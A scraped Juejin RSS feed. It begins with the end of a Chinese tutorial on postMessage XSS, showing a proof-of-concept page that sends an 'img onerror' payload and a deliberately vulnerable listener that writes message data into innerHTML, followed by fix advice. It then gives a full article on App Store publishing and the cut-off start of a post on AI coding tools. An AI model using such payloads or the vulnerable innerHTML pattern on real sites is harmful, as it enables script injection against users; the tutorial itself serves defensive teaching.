<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'btn'</span>).<span class="hljs-property">onclick</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>){       
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">poc</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">'http://begbounty.xyz/postmessage2.html'</span>);
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){        
        <span class="hljs-variable language_">window</span>.<span class="hljs-property">poc</span>.<span class="hljs-title function_">postMessage</span>({                                           
            <span class="hljs-string">"s"</span>: <span class="hljs-string">"&lt;img src =x onerror=alert(1);&gt;"</span>,
        },<span class="hljs-string">'*'</span>             
        );   
    },<span class="hljs-number">2000</span>);
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">场景3：白名单源/域存在反射/存储型XSS漏洞</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>    
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>        
        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>XSS_ME_<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>            
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>    
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">             
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'message'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) {                 
            <span class="hljs-keyword">if</span> (e.<span class="hljs-property">origin</span> == <span class="hljs-string">"http://149.28.205.217:8083"</span>) {                
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'s'</span>).<span class="hljs-property">innerHTML</span> = e.<span class="hljs-property">data</span>.<span class="hljs-property">s</span>;                    
            }             
        });                    
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>        
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>            
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>                
            <span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>                            
                <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"s"</span>&gt;</span>Postmessage XSS<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>            
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">text</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">input</span>&gt;</span>                            
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"hehe!"</span>&gt;</span>                            
            <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>            
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>         
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>如上代码片段所示，您会发现addEventListener()正在验证协议、主机名/IP和端口号。这意味着该函数将接收来自<a href="https://link.juejin.cn?target=http%3A%2F%2F149.28.205.217%3A8083%25E7%259A%2584%25E6%25B6%2588%25E6%2581%25AF%25E3%2580%2582" target="_blank" title="http://149.28.205.217:8083%E7%9A%84%E6%B6%88%E6%81%AF%E3%80%82" ref="nofollow noopener noreferrer">http://149.28.205.217:8083的消息。</a></p>
<p>如果<a href="https://link.juejin.cn?target=http%3A%2F%2F149.28.205.217%3A8083%25E5%25AD%2598%25E5%259C%25A8%25E5%25AD%2598%25E5%2582%25A8%2F%25E5%258F%258D%25E5%25B0%2584%25E5%259E%258BXSS%25E6%25BC%258F%25E6%25B4%259E%25E6%2580%258E%25E4%25B9%2588%25E5%258A%259E%25EF%25BC%259F" target="_blank" title="http://149.28.205.217:8083%E5%AD%98%E5%9C%A8%E5%AD%98%E5%82%A8/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F" ref="nofollow noopener noreferrer">http://149.28.205.217:8083存在存储/反射型XSS漏洞怎么办？</a></p>
<p>由于它容易受到反射型XSS攻击，我们可以利用此漏洞注入postMessage()利用代码。</p>
<p><strong>利用</strong></p>
<p><strong>修复方法</strong></p>
<ul>
<li>在window.addEventListener函数中白名单源</li>
<li>在白名单域时使用适当的正则表达式</li>
<li>在将域/主机白名单到函数之前，对所有页面执行跨站点脚本相关的测试用例</li>
</ul>
<p>感谢阅读本博客。</p>
<p>特别感谢Paresh Parmar。</p>
<p>如果您对博客文章有任何疑问，请随时在<a href="https://link.juejin.cn?target=https%3A%2F%2Ftwitter.com%2Farmaancrockroax%3Flang%3Den%25E4%25B8%258A%25E8%2581%2594%25E7%25B3%25BB%25E6%2588%2591%25E3%2580%2582" target="_blank" title="https://twitter.com/armaancrockroax?lang=en%E4%B8%8A%E8%81%94%E7%B3%BB%E6%88%91%E3%80%82" ref="nofollow noopener noreferrer">twitter.com/armaancrock…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[iOS 上架 App Store 全流程技术解读 应用构建、签名体系与发布通道的标准化方案]]></title>    <link>https://juejin.cn/post/7574704948153581620</link>    <guid>https://juejin.cn/post/7574704948153581620</guid>    <pubDate>2025-11-21T03:28:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574704948153581620" data-draft-id="7574704948153401396" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="iOS 上架 App Store 全流程技术解读 应用构建、签名体系与发布通道的标准化方案"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-21T03:28:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="aiopencode"/> <meta itemprop="url" content="https://juejin.cn/user/1898230261493865"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            iOS 上架 App Store 全流程技术解读 应用构建、签名体系与发布通道的标准化方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1898230261493865/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    aiopencode
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T03:28:53.000Z" title="Fri Nov 21 2025 03:28:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>上架 iOS 应用至 App Store 是移动端软件交付中不可跳过的流程。相比 Android 自由上传机制，苹果生态对应用的身份、签名、权限、内容与审核要求均有明确规范，因此在工程侧必须构建一条可重复、可审计、可维护的发布链路。</p>
<p>本文从工程体系视角，对 “iOS 上架 App Store” 的完整流程进行拆解，并给出适用于原生、跨平台、企业团队的标准化技术路径。</p>
<hr/>
<h2 data-id="heading-0"><strong>一、上架初始化：账号体系与权限结构</strong></h2>
<p>任何 App Store 上架流程的起点是账号体系的稳定配置。</p>
<h3 data-id="heading-1"><strong>1. Apple Developer Program 必备</strong></h3>
<p>需确保以下条件：</p>
<ul>
<li>账号付费状态正常</li>
<li>开发者后台可访问</li>
<li>团队权限分配明确</li>
</ul>
<p>工程侧推荐配置：</p>

























<table><thead><tr><th>角色</th><th>职责</th></tr></thead><tbody><tr><td>Account Holder</td><td>法务与账号管理</td></tr><tr><td>Admin</td><td>发布权限管理</td></tr><tr><td>App Manager</td><td>负责 App Store Connect 配置</td></tr><tr><td>Developer</td><td>负责构建与上传</td></tr></tbody></table>
<p>提前规划角色可降低后续上架阻塞风险。</p>
<hr/>
<h2 data-id="heading-2"><strong>二、签名体系构成：iOS 上架的核心技术要求</strong></h2>
<p>iOS 采用严格的签名链路，因此 App Store 上架必须具备以下要素：</p>
<h3 data-id="heading-3"><strong>1. App ID（Bundle Identifier）</strong></h3>
<p>格式示例：</p>
<pre><code class="hljs">com.team.product
</code></pre>
<p>需在开发阶段即确定，避免构建阶段调整造成签名不一致。</p>
<h3 data-id="heading-4"><strong>2. 发布证书（iOS Distribution Certificate）</strong></h3>
<p>作用：</p>
<ul>
<li>对 IPA 进行数字签名</li>
<li>确认 App 发布身份</li>
</ul>
<p>证书长期有效性对团队极其重要。</p>
<h3 data-id="heading-5"><strong>3. 描述文件（App Store Provisioning Profile）</strong></h3>
<p>需绑定：</p>
<ul>
<li>App ID</li>
<li>发布证书</li>
<li>分发方式：App Store</li>
</ul>
<h3 data-id="heading-6"><strong>跨平台证书生成方式</strong></h3>
<p>为适应 Windows、Linux 等非 macOS 环境，可使用开心上架（Appuploader）生成证书：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6116d387832a476ead15e931520c08d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWlvcGVuY29kZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764300533&amp;x-signature=HF62b1vIKDbpWtxZRvnOXJ%2F1JHY%3D" alt="证书生成" loading="lazy"/></p>
<p>输出的 p12 与描述文件可用于统一签名，适合跨平台团队。</p>
<hr/>
<h2 data-id="heading-7"><strong>三、IPA 构建流程：依赖技术栈的多路径实现</strong></h2>
<p>IPA 构建是上架的关键节点，其方式与技术栈直接关联。</p>
<h3 data-id="heading-8"><strong>1. 原生 iOS（Swift / Objective-C）</strong></h3>
<p>必须：</p>
<ul>
<li>在 macOS 环境</li>
<li>使用 Xcode Archive</li>
<li>导出 App Store 发布版本</li>
</ul>
<p>原生构建对系统依赖最高。</p>
<hr/>
<h3 data-id="heading-9"><strong>2. uni-app（HBuilderX）</strong></h3>
<p>特点：</p>
<ul>
<li>通过云打包生成 IPA</li>
<li>Windows、Linux 用户均可构建</li>
<li>适合 Web 技术团队</li>
<li>不依赖本地 Xcode 环境</li>
</ul>
<hr/>
<h3 data-id="heading-10"><strong>3. Flutter / React Native / Hybrid</strong></h3>
<p>常见构建方案：</p>
<ul>
<li>Codemagic</li>
<li>Bitrise</li>
<li>GitHub Actions（Mac Runner）</li>
<li>Jenkins + Mac 构建机</li>
</ul>
<p>工程侧建议将构建能力纳入 CI，使构建过程可审计、可复现。</p>
<hr/>
<h2 data-id="heading-11"><strong>四、IPA 上传通道：官方与跨平台方案并存</strong></h2>
<p>上传 IPA 到 App Store Connect 是发布链路的核心动作。</p>
<h3 data-id="heading-12"><strong>1. 官方上传方式（限 macOS）</strong></h3>





















<table><thead><tr><th>工具</th><th>特点</th></tr></thead><tbody><tr><td>Xcode Organizer</td><td>官方方式，适合原生团队</td></tr><tr><td>Transporter</td><td>图形化上传工具</td></tr><tr><td>altool</td><td>已淘汰，不再使用</td></tr></tbody></table>
<p>团队若缺乏足够 macOS 资源，上传将成为瓶颈。</p>
<hr/>
<h3 data-id="heading-13"><strong>2. 开心上架（Appuploader）跨平台上传通道（适用于 Windows / Linux / macOS）</strong></h3>
<p>命令行示例：</p>
<pre><code class="hljs language-bash" lang="bash">appuploader_cli -u ios@team.com -p xxx-xxx-xxx-xxx -c 2 -f ./dist/app.ipa
</code></pre>
<p>参数说明：</p>

























<table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>-u</td><td>Apple ID</td></tr><tr><td>-p</td><td>App 专用密码</td></tr><tr><td>-c</td><td>上传通道，2 为新协议</td></tr><tr><td>-f</td><td>指定 IPA 路径</td></tr></tbody></table>
<p>跨平台上传的工程优势：</p>
<ul>
<li>无需依赖单一 Mac</li>
<li>适用于自动化流水线</li>
<li>提供可追踪上传日志</li>
<li>适合分布式开发团队</li>
</ul>
<p>该方式可直接纳入企业 CI/CD，提升发布效率。</p>
<p>还有图形化界面：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f6f934cf7324cf688ad803ce0922521~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWlvcGVuY29kZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764300533&amp;x-signature=DWh6Djkdukz5r%2FOQQW2zCTH4xFk%3D" alt="ipa上传" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-14"><strong>五、App Store Connect 配置要求：内容层面必须满足的条件</strong></h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5c02c0fcbe747ddb7f17df44d1a459d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWlvcGVuY29kZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764300533&amp;x-signature=eVXuOH0HhCPHbsEoPIV0JOqOouI%3D" alt="asc" loading="lazy"/></p>
<p>上传 IPA 后需配置以下内容：</p>
<h3 data-id="heading-15"><strong>1. 截图要求</strong></h3>
<p>必须上传：</p>
<ul>
<li>iPhone 6.5 寸截图</li>
<li>iPhone 5.5 寸截图</li>
<li>iPad 截图（如支持）</li>
</ul>
<p>截图需真实反映应用界面。</p>
<h3 data-id="heading-16"><strong>2. 应用资料</strong></h3>
<p>包括：</p>
<ul>
<li>应用名称</li>
<li>简介与完整描述</li>
<li>关键词</li>
<li>技术支持链接</li>
<li>隐私政策 URL</li>
<li>版本号与构建号</li>
</ul>
<h3 data-id="heading-17"><strong>3. 权限用途说明（Info.plist）</strong></h3>
<p>每项权限均需描述：</p>
<ul>
<li>相机</li>
<li>麦克风</li>
<li>定位</li>
<li>相册</li>
<li>蓝牙</li>
</ul>
<p>缺少说明将直接导致审核拒绝。</p>
<hr/>
<h2 data-id="heading-18"><strong>六、审核要求：确保应用行为与内容符合规则</strong></h2>
<p>苹果审核标准主要覆盖：</p>
<h3 data-id="heading-19"><strong>1. 功能完整性</strong></h3>
<ul>
<li>不能出现闪退</li>
<li>关键路径必须可用</li>
</ul>
<h3 data-id="heading-20"><strong>2. 内容真实性</strong></h3>
<ul>
<li>截图不可虚构</li>
<li>展示信息需与功能一致</li>
</ul>
<h3 data-id="heading-21"><strong>3. 隐私规范（重点）</strong></h3>
<ul>
<li>不可收集未声明数据</li>
<li>不可访问未授权权限</li>
</ul>
<h3 data-id="heading-22"><strong>4. 支付规范</strong></h3>
<ul>
<li>涉及服务或内容购买必须使用 IAP</li>
<li>禁止外链支付</li>
</ul>
<p>工程团队需按审核要求提前进行风险排查。</p>
<hr/>
<h2 data-id="heading-23"><strong>工程建议：构建稳定上架链路的最佳实践</strong></h2>
<p>为了让上架流程长期可维护，建议团队采取以下策略：</p>
<h3 data-id="heading-24"><strong>1. 证书统一管理</strong></h3>
<p>避免多人多版本导致构建失败。</p>
<h3 data-id="heading-25"><strong>2. 构建流程自动化</strong></h3>
<p>将构建放入 CI，提高可重复性。</p>
<h3 data-id="heading-26"><strong>3. 跨平台上传流程</strong></h3>
<p>降低 macOS 资源依赖风险。</p>
<h3 data-id="heading-27"><strong>4. 版本发布可审计</strong></h3>
<p>所有发布操作需在日志中可追溯。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI “自动驾驶” 的使用分享]]></title>    <link>https://juejin.cn/post/7574728397373833268</link>    <guid>https://juejin.cn/post/7574728397373833268</guid>    <pubDate>2025-11-21T03:30:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574728397373833268" data-draft-id="7574671792998465571" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI “自动驾驶” 的使用分享"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-21T03:30:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="林小帅"/> <meta itemprop="url" content="https://juejin.cn/user/3175045313873943"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI “自动驾驶” 的使用分享
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3175045313873943/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    林小帅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T03:30:51.000Z" title="Fri Nov 21 2025 03:30:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body 